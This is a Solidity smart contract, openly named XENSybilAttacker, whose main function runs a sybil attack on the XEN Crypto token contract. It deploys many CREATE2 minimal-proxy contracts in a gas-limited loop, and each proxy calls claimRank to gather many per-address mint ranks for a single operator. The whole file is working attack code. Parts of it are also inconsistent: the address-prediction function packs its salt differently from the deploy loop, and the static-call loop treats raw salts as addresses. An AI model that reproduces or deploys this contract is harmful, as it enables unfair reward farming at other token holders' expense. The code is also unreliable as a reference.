// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

struct MintInfo {
    address user;
    uint256 term;
    uint256 maturityTs;
    uint256 rank;
    uint256 amplifier;
    uint256 eaaRate;
}

interface IXENCrypto {
    function claimRank(uint256 term) external;
    function userMints(address user) external view returns (MintInfo memory);
}

contract XENSybilAttacker {
    
    /**
     * @dev Performs sybil attack by creating multiple delegate contracts and calling claimRank
     * @param seed Salt seed for CREATE2
     * @param term Term to use for claimRank calls
     */
    function sybilAttack(address xenContract, uint256 seed, uint256 term) public {
        uint256 gasBuffer = 100000; // Buffer to ensure we don't run out of gas
        uint256 index = 0;

        // do 20 userMints static calls for previous addresses
        for (uint256 i = 0; i < 20; i++) {
            uint160 salt = uint160((uint256(seed) << 90) | (uint256(i) << 64) | uint256(uint64(bytes8(blockhash(block.number - 1)))));
            IXENCrypto(xenContract).userMints(address(uint160(uint256(salt))));
        }
        
        while (gasleft() > gasBuffer) {
            // Create salt for CREATE2 - pack seed, index and blockhash as uint96, uint96, and uint64 each
            bytes32 salt = bytes32((uint256(seed) << 160) | (uint256(index) << 64) | uint256(uint64(bytes8(blockhash(block.number - 1)))));
            
            // Create minimal proxy bytecode with this contract as implementation
            bytes memory bytecode = getMinimalProxyBytecode(address(this), salt);
            
            // Deploy using CREATE2
            address proxy;
            assembly {
                proxy := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
            }
            
            // Check deployment succeeded
            if (proxy == address(0)) {
                break; // CREATE2 failed, probably out of gas
            }
            
            // Call claimRank through the proxy
            // The proxy will delegatecall back to this contract, but msg.sender will be the proxy
            (bool success,) = proxy.call(abi.encodeWithSignature("claimRank(address,uint256)", xenContract, term));
            
            if (!success) {
                break; // Call failed, possibly out of gas or other error
            }
            
            index++;
        }
    }
    
    /**
     * @dev Function called by proxy contracts to execute claimRank
     * When called through delegatecall, msg.sender will be the proxy address
     */
    function claimRank(address xenContract, uint256 term) public {
        IXENCrypto(xenContract).claimRank(term);
    }
    
    /**
     * @dev Creates minimal proxy bytecode for given implementation
     */
    function getMinimalProxyBytecode(address implementation, bytes32 salt) internal pure returns (bytes memory) {
        // EIP-1167 minimal proxy bytecode with implementation address embedded
        return abi.encodePacked(
            hex"600b380380600b5f395ff3" // init code
            hex"363d3d373d3d3d363d73",
            implementation,
            hex"5af43d82803e903d91602b57fd5bf3",
            salt
        );
    }
    
    /**
     * @dev Predict the address of a proxy contract before deployment
     */
    function predictProxyAddress(uint256 seed, uint256 index) external view returns (address) {
        bytes32 salt = bytes32((uint256(seed) << 128) | uint256(index));
        bytes memory bytecode = getMinimalProxyBytecode(address(this), salt);
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                address(this),
                salt,
                keccak256(bytecode)
            )
        );
        return address(uint160(uint256(hash)));
    }
}
